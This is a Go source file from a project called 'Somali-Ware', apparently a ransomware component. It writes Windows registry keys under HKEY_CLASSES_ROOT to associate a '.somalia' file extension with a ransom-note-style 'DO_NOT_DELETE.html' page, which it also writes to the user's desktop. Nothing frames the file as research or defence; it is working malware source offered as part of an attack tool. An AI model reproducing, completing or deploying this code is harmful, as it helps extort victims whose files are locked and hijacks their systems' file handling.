package assoc

import (
	"Somali-Ware/modules/html"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"
)

const (
	REG_SZ    = 1
	KEY_WRITE = 0x20006
	KEY_READ  = 0x20019
)

var (
	modadvapi32        = syscall.NewLazyDLL("advapi32.dll")
	procRegCreateKeyEx = modadvapi32.NewProc("RegCreateKeyExW")
	procRegSetValueEx  = modadvapi32.NewProc("RegSetValueExW")
	procRegCloseKey    = modadvapi32.NewProc("RegCloseKey")
)

func GetHtmlFilePath() string {
	username := os.Getenv("USERNAME")
	return "C:\\Users\\" + username + "\\Desktop\\DO_NOT_DELETE.html"
}

func regCreateKey(keyPath string) (syscall.Handle, error) {
	var key syscall.Handle
	out, err := syscall.UTF16PtrFromString(keyPath)
	if err != nil {
		return syscall.InvalidHandle, err
	}
	_, _, err = procRegCreateKeyEx.Call(
		uintptr(0x80000000), // HKEY_CLASSES_ROOT
		uintptr(unsafe.Pointer(out)),
		0,
		uintptr(0),
		uintptr(0x00000001), // REG_OPTION_NON_VOLATILE
		uintptr(KEY_WRITE),
		uintptr(0),
		uintptr(unsafe.Pointer(&key)),
		0,
	)
	if err != syscall.Errno(0) {
		return syscall.InvalidHandle, err
	}
	return key, nil
}

func regSetValue(hKey syscall.Handle, valueName string, valueType uint32, data string) error {
	outValue, err := syscall.UTF16PtrFromString(valueName)
	if err != nil {
		return err
	}
	outData, err := syscall.UTF16PtrFromString(data)
	if err != nil {
		return err
	}
	_, _, err = procRegSetValueEx.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(outValue)),
		0,
		uintptr(valueType),
		uintptr(unsafe.Pointer(outData)),
		uintptr(len(data)*2),
	)
	if err != syscall.Errno(0) {
		return err
	}
	return nil
}

func regCloseKey(hKey syscall.Handle) error {
	_, _, err := procRegCloseKey.Call(uintptr(hKey))
	if err != syscall.Errno(0) {
		return err
	}
	return nil
}

func ChangeRegKeys() {
	fileExt := ".somalia"
	progID := "SomaliWareFile"

	key, err := regCreateKey(fileExt)
	if err != nil {
		log.Fatalf("Failed to create or open registry key: %v", err)
	}
	defer regCloseKey(key)

	err = regSetValue(key, "", REG_SZ, progID)
	if err != nil {
		log.Fatalf("Failed to set registry value: %v", err)
	}

	keyPath := progID + `\shell\open\command`
	key, err = regCreateKey(keyPath)
	if err != nil {
		log.Fatalf("Failed to create or open registry key: %v", err)
	}
	defer regCloseKey(key)

	command := fmt.Sprintf(`rundll32 url.dll,FileProtocolHandler "%s"`, GetHtmlFilePath())
	err = regSetValue(key, "", REG_SZ, command)
	if err != nil {
		log.Fatalf("Failed to set registry value: %v", err)
	}

	err = os.WriteFile(GetHtmlFilePath(), []byte(html.GetHTML()), 0644)
	if err != nil {
		log.Fatalf("Failed to write to file: %v", err)
	}

	fmt.Println("File association created successfully.")
}
